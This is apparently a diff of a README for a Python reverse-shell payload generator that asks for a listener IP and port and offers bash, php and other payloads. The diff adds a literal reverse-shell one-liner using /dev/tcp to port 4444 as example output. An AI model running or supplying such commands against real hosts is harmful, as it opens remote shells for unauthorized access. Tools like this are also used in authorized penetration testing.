@@ -1,7 +1,7 @@
 # revshell-generator
-a simple  python reverse shell  code generator script 
+A simple  python reverse shell  payload generator script 
 # command
-python lostsecrsh.pyc
+python sblsrvshell.py
 # set options
 type listener ip and port 
 # payload
@@ -11,4 +11,4 @@ type listener ip and port
  3.php ..etc)
  eg : if you need bash hit option number (1)
 # output
- you'll get a command for execute reverseshell with provided ip,port and payload settings
+ sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
